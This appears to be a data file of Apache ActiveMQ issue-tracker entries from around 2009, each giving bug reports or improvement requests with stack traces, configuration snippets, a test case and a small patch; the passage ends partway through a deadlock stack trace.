I have a configuration where I first start application A with an embedded broker that is not initiating any broker-to-broker connections.Then, in rapid succession, I start applications B, C, and D, all with embedded brokers that are initiating broker-to-broker connections only to A. Often, this is all on the same machine.I commonly - but not always - see the following: (this stack trace is 5.1. I have seen this issue on 5.2 also)java.lang.NullPointerException        at org.apache.activemq.network.DemandForwardingBridgeSupport.contains(DemandForwardingBridgeSupport.java:748)        at org.apache.activemq.network.DemandForwardingBridgeSupport.serviceRemoteConsumerAdvisory(DemandForwardingBridgeSupport.java:471)        at org.apache.activemq.network.DemandForwardingBridgeSupport.serviceRemoteCommand(DemandForwardingBridgeSupport.java:416)        at org.apache.activemq.network.DemandForwardingBridgeSupport$2.onCommand(DemandForwardingBridgeSupport.java:154)        at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:104)        at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68)        at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:143)        at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:206)        at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:84)        at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:196)        at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:183)        at java.lang.Thread.run(Thread.java:619) The brokerId field is null. I don"t see where localBrokerPath&#91;0&#93; is ever set to anything but null.
issueID:AMQ-2200
type:Bug
changed files:
texts:TopicSubscriptionView returns -1 for SessionId and MaxPendingQueueSize
The TopicSubscriptionView returns -1 for SessionId and MaxPendingQueueSize and is reflected on the JMX JConsole client.
issueID:AMQ-2203
type:Bug
changed files:
texts:Duplication of Camel routes in activemq.xml and applicationContext.xml for Camel web app.
It appears that there are now duplicate configuration points for Camel routes.  In the activemq.xml configuration file, the following configuration exists:    <!--    ** Lets deploy some Enterprise Integration Patterns inside the ActiveMQ Message Broker    ** For more details see    **    ** http://activemq.apache.org/enterprise-integration-patterns.html    -->    <camelContext id="camel" xmlns="http://camel.apache.org/schema/spring">        <!-- You can use a <package> element for each root package to search for Java routes -->        <package>org.foo.bar</package>        <!-- You can use Spring XML syntax to define the routes here using the <route> element -->        <route>            <from uri="activemq:example.A"/>            <to uri="activemq:example.B"/>        </route>    </camelContext>    <!--    ** Lets configure some Camel endpoints    **    ** http://activemq.apache.org/camel/components.html    -->    <!-- configure the camel activemq component to use the current broker -->    <bean id="activemq" class="org.apache.activemq.camel.component.ActiveMQComponent" >        <property name="connectionFactory">          <bean class="org.apache.activemq.ActiveMQConnectionFactory">            <property name="brokerURL" value="vm://localhost?create=false&amp;waitForStart=10000" />            <property name="userName" value="${activemq.username}"/>            <property name="password" value="${activemq.password}"/>          </bean>        </property>    </bean>This is duplicated in the webappscamelWEB-INFapplicationContext.xml file:  <camelContext xmlns="http://camel.apache.org/schema/spring">    <route>        <from uri="activemq:example.A"/>        <to uri="activemq:example.B"/>    </route>  </camelContext>  <!-- configure the camel activemq component to use the current broker -->  <bean id="activemq" class="org.apache.activemq.camel.component.ActiveMQComponent" >    <property name="exposeAllQueues" value="true"/>      <property name="connectionFactory">        <bean class="org.apache.activemq.ActiveMQConnectionFactory">          <property name="brokerURL" value="vm://localhost?create=false&amp;waitForStart=10000" />          <property name="userName" value="${activemq.username}"/>          <property name="password" value="${activemq.password}"/>        </bean>      </property>  </bean>The net effect of this is that when the broker is launched, there will be two consumers routing messages from example.A to example.B.  At best, this causes unnecessary overhead.  If a user edits the activemq.xml file to remove the route information, they think they have removed this camel route.  However, when the broker is restarted, the route still exists, only now with a single consumer routing the messages.  To truly remove the route, the user must also edit the applicationContext.xml.If the configuration of Camel routes is now being handled in the applicationContext.xml file, then the obsolete configuration should be removed from activemq.xml and documentation should be updated.  In any case, the duplication of Camel routes in a default configuration should be eliminated.
issueID:AMQ-2209
type:Bug
changed files:
texts:Deleting a queue via the admin console does not fully delete persistent messages in that queue
Here are the instructions to reproduce the issue: Create a queue with admin console Post one "persistent" message in queue "testQueue" Delete queue via admin console Post one "persistent" message in queue "testQueue"Now there is 2 messages in testQueue !
issueID:AMQ-2210
type:Bug
changed files:PrefetchSubscription.java
texts:Infinite loop: WARN  PrefetchSubscription           - Ack before disaptch, waiting for recovery dispatch: MessageAck
Reproduce steps:1. setup 4 network of brokers with multicast discovery2. start client consumers and producers3. let the producer produce message constantly4. in jconsole, stop() the broker the consumers are connecting to5. after the consumers failover to another broker, the newly connected broker will get into an infinite loop:WARN  PrefetchSubscription           - Ack before disaptch, waiting for recovery dispatch: MessageAck {commandId = 1232, responseRequired = true, ackType = 2, consumerId = ID:host01-39430-1239887122787-0:0:2:1, firstMessageId = ID:host01-39430-1239887122787-0:0:87:1:5, lastMessageId = ID:host01-39430-1239887122787-0:0:87:1:5, destination = queue://Consumer.A-host01-1527-1239887124983.VirtualTopic.B, transactionId = TX:ID:host01-39430-1239887122787-0:0:38, messageCount = 1}This broker will stop functioning and consumer is not processing messages.
issueID:AMQ-2212
type:Bug
changed files:
texts:RAR on Weblogic: embedded broker fails to start with : org.springframework.beans.factory.BeanDefinitionStoreException: IOException parsing XML document from class path resource [broker-config.xml]; nested exception is java.io.FileNotFoundException: class
<Apr 16, 2009 10:21:12 PM IST> <Warning> <Socket> <BEA-000402> <There are: 5 active sockets, but the maximum number of socket reader threads allowed by the configuration is: 4. You may want to alter your configuration.> <Apr 16, 2009 10:21:53 PM IST> <Warning> <netuix> <BEA-423420> <Redirect is executed in begin or refresh action. Redirect url is /console/console.portal?_nfpb=true&_pageLabel=HomePage1.> <Apr 16, 2009 10:23:25 PM IST> <Warning> <Connector> <BEA-190155> <Compliance checking/validation of the resource adapter /Users/gtully/j2ee/bea/user_projects/domains/base_domain/servers/AdminServer/upload/activemq-rar-5.3-SNAPSHOT.rar resulted in the following warnings:The ra.xml <resourceadapter-class> class "org.apache.activemq.ra.ActiveMQResourceAdapter" should implement java.io.Serializable but does not.> 2009-04-16 22:23:26,074 [ (self-tuning)"] DEBUG ActiveMQResourceAdapter        - setting [password] property2009-04-16 22:23:26,074 [ (self-tuning)"] DEBUG ActiveMQResourceAdapter        - setting [useInboundSession] to: false2009-04-16 22:23:26,075 [ (self-tuning)"] DEBUG ActiveMQResourceAdapter        - setting [serverUrl] to: tcp://localhost:616162009-04-16 22:23:26,075 [ (self-tuning)"] DEBUG ActiveMQResourceAdapter        - setting [userName] to: defaultUser<Apr 16, 2009 10:23:26 PM IST> <Warning> <WorkManager> <BEA-002919> <Unable to find a WorkManager with name activemq-rar-5.3-SNAPSHOT.rar. Dispatch policy activemq-rar-5.3-SNAPSHOT.rar will map to the default WorkManager for the application activemq-rar-5> 2009-04-16 22:23:26,432 [ActiveMQ Broker] DEBUG XBeanBrokerFactory             - Now attempting to figure out the type of resource: broker-config.xml2009-04-16 22:23:26,679 [ActiveMQ Broker] INFO  ResourceXmlApplicationContext  - Refreshing org.apache.xbean.spring.context.ResourceXmlApplicationContext@22886042: display name [org.apache.xbean.spring.context.ResourceXmlApplicationContext@22886042]; startup date [Thu Apr 16 22:23:26 IST 2009]; root of context hierarchy2009-04-16 22:23:27,409 [ActiveMQ Broker] INFO  XBeanXmlBeanDefinitionReader   - Loading XML bean definitions from class path resource [broker-config.xml]2009-04-16 22:23:27,416 [ActiveMQ Broker] WARN  ActiveMQResourceAdapter        - Could not start up embeded ActiveMQ Broker "xbean:broker-config.xml": IOException parsing XML document from class path resource [broker-config.xml]; nested exception is java.io.FileNotFoundException: class path resource [broker-config.xml] cannot be opened because it does not exist2009-04-16 22:23:27,450 [ActiveMQ Broker] DEBUG ActiveMQResourceAdapter        - Reason for: IOException parsing XML document from class path resource [broker-config.xml]; nested exception is java.io.FileNotFoundException: class path resource [broker-config.xml] cannot be opened because it does not existorg.springframework.beans.factory.BeanDefinitionStoreException: IOException parsing XML document from class path resource [broker-config.xml]; nested exception is java.io.FileNotFoundException: class path resource [broker-config.xml] cannot be opened because it does not exist at org.springframework.beans.factory.xml.XmlBeanDefinitionReader.loadBeanDefinitions(XmlBeanDefinitionReader.java:349) at org.springframework.beans.factory.xml.XmlBeanDefinitionReader.loadBeanDefinitions(XmlBeanDefinitionReader.java:310) at org.apache.xbean.spring.context.ResourceXmlApplicationContext.loadBeanDefinitions(ResourceXmlApplicationContext.java:111) at org.apache.xbean.spring.context.ResourceXmlApplicationContext.loadBeanDefinitions(ResourceXmlApplicationContext.java:104) at org.springframework.context.support.AbstractRefreshableApplicationContext.refreshBeanFactory(AbstractRefreshableApplicationContext.java:123) at org.springframework.context.support.AbstractApplicationContext.obtainFreshBeanFactory(AbstractApplicationContext.java:423) at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:353) at org.apache.xbean.spring.context.ResourceXmlApplicationContext.<init>(ResourceXmlApplicationContext.java:64) at org.apache.xbean.spring.context.ResourceXmlApplicationContext.<init>(ResourceXmlApplicationContext.java:52) at org.apache.activemq.xbean.XBeanBrokerFactory.createApplicationContext(XBeanBrokerFactory.java:96) at org.apache.activemq.xbean.XBeanBrokerFactory.createBroker(XBeanBrokerFactory.java:52) at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:71) at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:54) at org.apache.activemq.ra.ActiveMQResourceAdapter$1.run(ActiveMQResourceAdapter.java:78)Caused by: java.io.FileNotFoundException: class path resource [broker-config.xml] cannot be opened because it does not exist at org.springframework.core.io.ClassPathResource.getInputStream(ClassPathResource.java:142) at org.springframework.beans.factory.xml.XmlBeanDefinitionReader.loadBeanDefinitions(XmlBeanDefinitionReader.java:336) ... 13 more2009-04-16 22:23:27,468 [ (self-tuning)"] DEBUG tiveMQManagedConnectionFactory - copying standard ResourceAdapter configuration properties2009-04-16 22:23:27,468 [ (self-tuning)"] DEBUG tiveMQManagedConnectionFactory - setting [clientid] to: null2009-04-16 22:23:27,468 [ (self-tuning)"] DEBUG tiveMQManagedConnectionFactory - setting [password] property2009-04-16 22:23:27,468 [ (self-tuning)"] DEBUG tiveMQManagedConnectionFactory - setting [serverUrl] to: tcp://localhost:61616
issueID:AMQ-2213
type:Bug
changed files:
texts:Equals method return wrong result for TopicSession / QueueSession
The equals method return false even when it is executed on the same object for the specialized classes of Session (TopicSession, QueueSession). If those objects are held within a List, the contains method would return false even if the object in question is already in the list. This is a minor issue as the cleanups are normally done on the connection level and users shouldn"t need to keep track of open sessions for a later cleanup.
issueID:AMQ-2216
type:Bug
changed files:
texts:Non temporary destination removing failure
When deleting a non temporary destination and after restarting ActiveMQ the destination is reloaded : so in fact this destination has not been deleted.
issueID:AMQ-2217
type:Bug
changed files:
texts:Message delivery to selector based consumers pauses if selector leaves messages on the queue.
I have written a test case which will demonstrate the difference between the following two scenarios:1. Producer sending dissimilar JMSType messages to a queue, with a client consuming all messages (no selector).2. Producer sending dissimilar JMSType messages to a queue, with a client consuming every other message (using selector).With a large enough size of test messages (for my environment about 5k), scenario 2 will fail with delivery to the consumer halted, while scenario 1 will not.Test Output:waiting for consumer to pause ... consumer: 0, producer: 0waiting for consumer to pause ... consumer: 200, producer: 5000waiting for consumer to pause ... consumer: 200, producer: 5000waiting for consumer to pause ... consumer: 200, producer: 5000waiting for consumer to pause ... consumer: 200, producer: 5000waiting for consumer to pause ... consumer: 200, producer: 5000
issueID:AMQ-2219
type:Bug
changed files:
texts:Admin console message.jsp references non-existant messageQuery.JMSMessageID field
The Admin console/webapp can display a list of messages pending in a queue.  When you click on the link provided for one of the messages, the message details are shown.  That is, unless the message is no longer pending, at which point the Admin console throws an exception:javax.el.PropertyNotFoundException: The class "org.apache.activemq.web.MessageQuery" does not have the property "JMSMessageID".        at javax.el.BeanELResolver.getBeanProperty(BeanELResolver.java:547)        at javax.el.BeanELResolver.getValue(BeanELResolver.java:249)        at javax.el.CompositeELResolver.getValue(CompositeELResolver.java:143)        at com.sun.el.parser.AstValue.getValue(AstValue.java:138)        at com.sun.el.ValueExpressionImpl.getValue(ValueExpressionImpl.java:206)        at org.apache.jasper.runtime.PageContextImpl.evaluateExpression(PageContextImpl.java:984)        at org.apache.jsp.message_jsp._jspx_meth_c_when_0(org.apache.jsp.message_jsp:189)        at org.apache.jsp.message_jsp._jspx_meth_c_choose_0(org.apache.jsp.message_jsp:153)        at org.apache.jsp.message_jsp._jspService(org.apache.jsp.message_jsp:99)        at org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:93)        at javax.servlet.http.HttpServlet.service(HttpServlet.java:806)etc...The culprit is line 29 of message.jsp, which ismessage.jspNo message could be found for ID ${requestContext.messageQuery.JMSMessageID}This should instead be message.jspNo message could be found for ID ${requestContext.messageQuery.id}
issueID:AMQ-2220
type:Bug
changed files:ReadOnlyContext.java
texts:No sub-contexts for Queues / Topics created from jndi.properties
new InitialContext().list("queue") should return the 2 Queues defined in the jndi.properties (see below) but thows "javax.naming.NameNotFoundException: queuejndi.properties:java.naming.factory.initial=org.apache.activemq.jndi.ActiveMQInitialContextFactoryjava.naming.provider.url = vm://localhostqueue.queue/testQueue=queue.TestQueuequeue.queue/testQueue2=queue.TestQueue2When the ReadOnlyContext is created nested contexts are not resolved.
issueID:AMQ-2221
type:Improvement
changed files:TimeStampingBrokerPlugin.java
texts:Suggested improvements to the TimeStampingBrokerPlugin
One area of weakness in the broker setup is the ability of the administrator to exercise some control over the use of expiration time.Enclosed with this issue is a patched version of the plugin which exposes 2 new attributes that allow some override control for zero expiration messages, and message expiration ceiling.
issueID:AMQ-2224
type:Improvement
changed files:
texts:Enable Tracing of Messages in a network of brokers
In environments that have a larger network of brokers set up, it is sometimes of interest which path a message has taken from the producer to the consumer. One could enable tracing in the brokers and kind of review the log files, but this is very time consuming if not impossible. I propose a small BrokerPlugin that can be used to append the brokerName to a given message property. On the consumer side or in the logs we could then evaluate that property and see exactly which broker has been touched by the message.
issueID:AMQ-2226
type:Bug
changed files:
texts:Ensure activemq-fileserver web.xml conforms to schema
The web.xml for activemq-fileserver did not validate correctly. This patch just reorders elements so that the document is valid.
issueID:AMQ-2229
type:Improvement
changed files:
texts:Remove warnings from CSS file
The CSS file had a bunch of things that produced warnings (i.e. duplicate font-size, no default font name etc). Attached patch fixes this.
issueID:AMQ-2231
type:Improvement
changed files:
texts:Adjust POM to remove "platform dependent" warning and missing inceptionYear
Attached is a patch that specifies the source encoding to remove a warning such as &#91;1&#93;. Also the inceptionYear is specified so the build does not complain about it.&#91;1&#93; "Using platform encoding (MacRoman actually) to copy filtered resources, i.e. build is platform dependent!"
issueID:AMQ-2232
type:Bug
changed files:
texts:JMX Credentials Not Respected When Trying To Move Messages
On a secured broker, with secured JMX, and secured Web Console, message move/copy actions fail to use established authentication mechanisms. Error returned is: User ActiveMQBroker is not authorized to write to: queue. The specified user(ActiveMQBroker) is not the user provided for JMX or Web Console access.Disabling security will allow for message move/copy actions to complete successfully. All attempts to accomodate the username being used(ActiveMQBroker), by adding the user into authentication configs in the broker XML config or the jmx authentication files, have failed.  Changing our JMX users and passwords to match the simple authentication setup in the broker XML config also have had no effect.
issueID:AMQ-2233
type:Bug
changed files:
texts:After rollback received messages not re-presented
After rollback received messages not re-presented.  If I receive in a transaction and then roll back the messages should be re-presented in the next transaction.  This used to work in 5.1.0, but is broken in 5.2.0.You can browse the Queue in JMX after the rollback and see that the messages are still there, but they are not received by a consumer in the same process.Here"s a test case (fails on the checkPostConditions()):public class RawRollbackTests {  private static ConnectionFactory connectionFactory; private static Destination queue; private static BrokerService broker; @BeforeClass public static void clean() throws Exception {  FileUtils.deleteDirectory(new File("activemq-data"));  broker = new BrokerService();  broker.setUseJmx(true);  broker.start();  ActiveMQConnectionFactory connectionFactory = new ActiveMQConnectionFactory();  connectionFactory.setBrokerURL("vm://localhost?async=false");  RawRollbackTests.connectionFactory = connectionFactory;  queue = new ActiveMQQueue("queue"); } @AfterClass public static void close() throws Exception {  broker.stop(); } @Before public void clearData() throws Exception {  getMessages(false); // drain queue  convertAndSend("foo");  convertAndSend("bar"); } @After public void checkPostConditions() throws Exception {  Thread.sleep(1000L);  List<String> list = getMessages(false);  assertEquals(2, list.size()); } @Test public void testReceiveMessages() throws Exception {  List<String> list = getMessages(true);  assertEquals(2, list.size());  assertTrue(list.contains("foo")); }  private void convertAndSend(String msg) throws Exception {  Connection connection = connectionFactory.createConnection();  connection.start();  Session session = connection.createSession(true, Session.AUTO_ACKNOWLEDGE);  MessageProducer producer = session.createProducer(queue);  producer.send(session.createTextMessage(msg));  producer.close();  session.commit();  session.close();  connection.close(); } private List<String> getMessages(boolean rollback) throws Exception {  Connection connection = connectionFactory.createConnection();  connection.start();  Session session = connection.createSession(true, Session.AUTO_ACKNOWLEDGE);  String next = "";  List<String> msgs = new ArrayList<String>();  while (next != null) {   next = (String) receiveAndConvert(session);   if (next != null)    msgs.add(next);  }  if (rollback) {   session.rollback();  } else {   session.commit();  }  session.close();  connection.close();  return msgs; } private String receiveAndConvert(Session session) throws Exception {  MessageConsumer consumer = session.createConsumer(queue);  Message message = consumer.receive(100L);  consumer.close();  if (message==null) {   return null;  }  return ((TextMessage)message).getText(); }}
issueID:AMQ-2238
type:Improvement
changed files:
texts:Improve HTTP transport reliability
Currently transport tests are excluded and some of them are failing. One of the problems I noticed is related to clients connecting/reconnecting, which can freeze them. We should make standard tests (at least those currently in the trunk) pass and make this transport as reliable as others.
issueID:AMQ-2239
type:New Feature
changed files:
texts:Stomp wire format doesn&#39;t work with tcp or nio transport
It appears to us that there is some sort of architectural problem with how stomp has been implemented in ActiveMQ. As we understand it, stomp is an application-level wire protocol. However the implementation seems to combine both wire protocol and it"s own transport implementation based directly on the tcp socket factory. Not sure what the reason was for this...but it seems like it compromises the layering of wire protocols over transports.Why we started looking at this, was we wanted to use NIO with Stomp to get the best scalability. In particular, we don"t want a server thread being consumed for every long-lived stomp connection. However, although one sees references in mailing lists to the fact that stomp://localhost:61613 is equivalent to  tcp://localhost:61613?wireFormat=stomp, in fact the latter does not work and produces this exception:Exception in thread "BrokerService"java.lang.ClassCastException: org.apache.activemq.command.BrokerInfo cannot be cast to org.apache.activemq.transport.stomp.StompFrameat org.apache.activemq.transport.stomp.StompWireFormat.marshal(StompWireFormat.java:64)at org.apache.activemq.transport.tcp.TcpTransport.oneway(TcpTransport.java:166)at org.apache.activemq.transport.InactivityMonitor.oneway(InactivityMonitor.java:233)at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:40)at org.apache.activemq.broker.TransportConnection.dispatch(TransportConnection.java:1207)at org.apache.activemq.broker.TransportConnection.processDispatch(TransportConnection.java:793)at org.apache.activemq.broker.TransportConnection.iterate(TransportConnection.java:830)at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:122)at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:43)at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(Unknown Source)at java.util.concurrent.ThreadPoolExecutor$Worker.run(Unknown Source)at java.lang.Thread.run(Unknown Source)Because of this, it is not possible to specify for example, <transportConnectors>  <transportConnector name="stomp" uri="nio://localhost:61613?wireFormat=stomp"/></transportConnectors>We did try altering the implementation of StompTransportFactory to extend NIOTransportFactory instead of TcpTransportFactory. It compiled OK, but it didn"t seem to actually work in our tests...the client gets EOF reading the socket for some reason.
issueID:AMQ-2240
type:Bug
changed files:
texts:Camel ActiveMQComponent - Please add validation of unknown or invalid URI parameters
AMQ is used a lot with Camel and vice-versa. In AMQ there is a activemq-camel.jar for easy AMQ-Camel integration.As Camel often uses URI for configuration we in Camel have validation for all parameters provided in the URI.But this is lacked in the activemq-camel.jar so you can provide bogus or misspelled options and AMQ just keeps on running.This is serious as it can be hard to overlook a tiny misspelled option and you think that it runs with this parameter, but it does not!This seems to only apply for "nested" URI options, eg the options prefixed with jms brokerFor instance using this factory method:org.apache.activemq.camel.component.ActiveMQComponent.activeMQComponent(String uri);In the sample code below, for a unit test, where I have mistyped some URI options by inserting XXX or the likes:        ActiveMQComponent activemq = activeMQComponent("vm://localhost?broker.XXX=foo&broker.persistent=XXX&broker.useJmx=false&jms.redeliveryPolicy.maximumRedeliveries=0&jms.redeliveryPolicy.initialRedeliveryDelay=500&jms.useAsyncSend=false&jms.sendTimeout=ABC&jms.maxXXXXReconnectAttempts=1&jms.timeout=3000");But AMQ 5.2 is just started without any error indications2009-05-01 09:16:53,247 [main           ] INFO  BrokerService                  - ActiveMQ 5.2.0 JMS Message Broker (localhost) is starting2009-05-01 09:16:53,248 [main           ] INFO  BrokerService                  - For help or more information please see: http://activemq.apache.org/2009-05-01 09:16:53,392 [main           ] INFO  KahaStore                      - Kaha Store using data directory activemq-data/localhost/kr-store/data2009-05-01 09:16:53,513 [main           ] INFO  BrokerService                  - ActiveMQ JMS Message Broker (localhost, ID:davsclaus.local-50096-1241162213265-0:0) started2009-05-01 09:16:53,520 [main           ] INFO  TransportConnector             - Connector vm://localhost StartedBut if I enter an invalid URI without the prefix such as: bla=foo        ActiveMQComponent activemq = activeMQComponent("vm://localhost?bla=foo");I get a nice error reportorg.apache.camel.RuntimeCamelException: org.springframework.jms.UncategorizedJmsException: Uncategorized exception occured during JMS processing; nested exception is javax.jms.JMSException: Could not create Transport. Reason: java.lang.IllegalArgumentException: Invalid connect parameters: {bla=foo}
issueID:AMQ-2241
type:Bug
changed files:
texts:On failover it is possible to get duplicate connections broker side which can result in: Cannot add a consumer to a session that had not been registered:
localhost Cannot add a consumer to a session that had not been registered: ID:localhost-40888-1241048176812-0:19:-1 at org.apache.activemq.util.JMSExceptionSupport.create(JMSExceptionSupport.java:49) at org.apache.activemq.ActiveMQConnection.syncSendPacket(ActiveMQConnection.java:1255) at org.apache.activemq.AdvisoryConsumer.<init>(AdvisoryConsumer.java:50) at org.apache.activemq.ActiveMQConnection.ensureConnectionInfoSent(ActiveMQConnection.java:1359) at org.apache.activemq.ActiveMQConnection.createSession(ActiveMQConnection.java:300) at org.apache.activemq.ra.ManagedConnectionProxy.createSessionProxy(ManagedConnectionProxy.java:119) at org.apache.activemq.ra.ManagedConnectionProxy.createSession(ManagedConnectionProxy.java:105) at org.springframework.jms.support.JmsAccessor.createSession(JmsAccessor.java:196) at org.springframework.jms.core.JmsTemplate.execute(JmsTemplate.java:462) ... 35 moreCaused by: java.lang.IllegalStateException: localhost Cannot add a consumer to a session that had not been registered: ID:localhost-40888-1241048176812-0:19:-1 at org.apache.activemq.broker.TransportConnection.processAddConsumer(TransportConnection.java:540) at org.apache.activemq.command.ConsumerInfo.visit(ConsumerInfo.java:349) at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:308) at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:182) at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68) at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:143) at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:210) at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:84) at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:203) at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:185) at java.lang.Thread.run(Thread.java:619)
issueID:AMQ-2245
type:Improvement
changed files:
texts:Allow restart of embedded broker
Currently we don"t allow restarting the stopped broker and instead developers need to create another instance of the broker and start it. Usually this is a desired behavior and should remain a default one. But we should provide an option to people wanting to start stopped brokers. The proposed enhancement will introduce public void start(boolean force);method, which will force the broker to start.
issueID:AMQ-2246
type:Bug
changed files:
texts:Failover transport causes connection / thread leak when broker is unresponsive
We have observed in a production environment cases where an overloaded ActiveMQ broker stops responding to requests in a timely manner &#8211; connections can be created, but communication is slow enough to trigger reconnect.Unfortunately, the old connections never get cleaned up, leading to resource exhaustion on the both the clients and the broker.
issueID:AMQ-2249
type:Bug
changed files:SessionPool.java
PooledSession.java
texts:The pool is not being informed that invalid PooledSessions are being thrown away
PooledConnection.close() calls rollback() on the internal session. However, when the internal session is an instance of  ActiveMQXASession, this always results in a TransactionInProgressException being thrown (and subsequently caught). Unfortunately, in this path of execution, the session pool is not informed.The sessionPool knows nothing about the session being discarded and ultimately, GenericObjectPool.borrowObject() blocks forever since _numActive is never decremented.I think the pool should at least be told that the session has been invalidated (this is not a full fix but should at least stop any hanging threads). Below is a partial patch (I"ll work on a full solution when I have time): Index: activemq-pool/src/main/java/org/apache/activemq/pool/PooledSession.java===================================================================--- activemq-pool/src/main/java/org/apache/activemq/pool/PooledSession.java     (revision 768326)+++ activemq-pool/src/main/java/org/apache/activemq/pool/PooledSession.java     (working copy)@@ -120,6 +120,7 @@                         LOG.trace("Ignoring exception as discarding session: " + e1, e1);                     }                     session = null;+                    sessionPool.invalidateSession(this);                     return;                 }             }Index: activemq-pool/src/main/java/org/apache/activemq/pool/SessionPool.java===================================================================--- activemq-pool/src/main/java/org/apache/activemq/pool/SessionPool.java       (revision 768326)+++ activemq-pool/src/main/java/org/apache/activemq/pool/SessionPool.java       (working copy)@@ -59,6 +59,14 @@             throw JMSExceptionSupport.create(e);         }     }+    +    public void invalidateSession(PooledSession session) throws JMSException {+       try {+            getSessionPool().invalidateObject(session);+        } catch (Exception e) {+            throw JMSExceptionSupport.create("Failed to invalidate session: " + e, e);+        }+    }      public void returnSession(PooledSession session) throws JMSException {         // lets check if we are already closed
issueID:AMQ-2252
type:Bug
changed files:
texts:deadlock with NIO transport and optimizeDispatch
With concurrent producers and consumers on a queue, it is possible to reproduce the following deadlock:Found one Java-level deadlock:============================="NIO Transport Thread":  waiting to lock monitor 0x08c78cd4 (object 0x821986b8, a org.apache.activemq.broker.region.Queue$2),  which is held by "NIO Transport Thread""NIO Transport Thread":  waiting to lock monitor 0x08c78d14 (object 0x82198170, a java.lang.Object),  which is held by "NIO Transport Thread"Java stack information for the threads listed above:==================================================="NIO Transport Thread": at org.apache.activemq.broker.region.Queue.iterate(Queue.java:1024) - waiting to lock <0x821986b8> (a org.apache.activemq.broker.region.Queue$2) at org.apache.activemq.broker.region.Queue.wakeup(Queue.java:1240) at org.apache.activemq.broker.region.Queue.removeMessage(Queue.java:1159) at org.apache.activemq.broker.region.QueueSubscription.acknowledge(QueueSubscription.java:51) at org.apache.activemq.broker.region.PrefetchSubscription.acknowledge(PrefetchSubscription.java:255) - locked <0x82198170> (a java.lang.Object) at org.apache.activemq.broker.region.AbstractRegion.acknowledge(AbstractRegion.java:377) at org.apache.activemq.broker.region.RegionBroker.acknowledge(RegionBroker.java:463) at org.apache.activemq.broker.TransactionBroker.acknowledge(TransactionBroker.java:194) at org.apache.activemq.broker.BrokerFilter.acknowledge(BrokerFilter.java:74) at org.apache.activemq.broker.BrokerFilter.acknowledge(BrokerFilter.java:74) at org.apache.activemq.broker.MutableBrokerFilter.acknowledge(MutableBrokerFilter.java:85) at org.apache.activemq.broker.TransportConnection.processMessageAck(TransportConnection.java:461) at org.apache.activemq.command.MessageAck.visit(MessageAck.java:205) at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:308) at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:182) at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68) at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113) at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:210) - locked <0x8219bfb8> (a org.apache.activemq.transport.InactivityMonitor$1) at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:84) at org.apache.activemq.transport.nio.NIOTransport.serviceRead(NIOTransport.java:128) at org.apache.activemq.transport.nio.NIOTransport.access$000(NIOTransport.java:44) at org.apache.activemq.transport.nio.NIOTransport$1.onSelect(NIOTransport.java:68) at org.apache.activemq.transport.nio.SelectorSelection.onSelect(SelectorSelection.java:62) at org.apache.activemq.transport.nio.SelectorWorker$1.run(SelectorWorker.java:98) at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:650) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:675) at java.lang.Thread.run(Thread.java:595)"NIO Transport Thread": at org.apache.activemq.broker.region.PrefetchSubscription.dispatchPending(PrefetchSubscription.java:585) - waiting to lock <0x82198170> (a java.lang.Object) - locked <0x82198168> (a java.lang.Object) at org.apache.activemq.broker.region.PrefetchSubscription.add(PrefetchSubscription.java:158) at org.apache.activemq.broker.region.Queue.doActualDispatch(Queue.java:1377) at org.apache.activemq.broker.region.Queue.doDispatch(Queue.java:1331) - locked <0x82198650> (a java.util.ArrayList) at org.apache.activemq.broker.region.Queue.pageInMessages(Queue.java:1420) at org.apache.activemq.broker.region.Queue.iterate(Queue.java:1103) - locked <0x821986b8> (a org.apache.activemq.broker.region.Queue$2) at org.apache.activemq.broker.region.Queue.wakeup(Queue.java:1240) at org.apache.activemq.broker.region.Queue.sendMessage(Queue.java:1235) at org.apache.activemq.broker.region.Queue.doMessageSend(Queue.java:537) at org.apache.activemq.broker.region.Queue.send(Queue.java:480) at org.apache.activemq.broker.region.AbstractRegion.send(AbstractRegion.java:354) at org.apache.activemq.broker.region.RegionBroker.send(RegionBroker.java:438) at org.apache.activemq.broker.TransactionBroker.send(TransactionBroker.java:224) at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:126) at org.apache.activemq.broker.CompositeDestinationBroker.send(CompositeDestinationBroker.java:95) at org.apache.activemq.broker.MutableBrokerFilter.send(MutableBrokerFilter.java:133) at org.apache.activemq.broker.TransportConnection.processMessage(TransportConnection.java:455) at org.apache.activemq.command.ActiveMQMessage.visit(ActiveMQMessage.java:639) at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:308) at 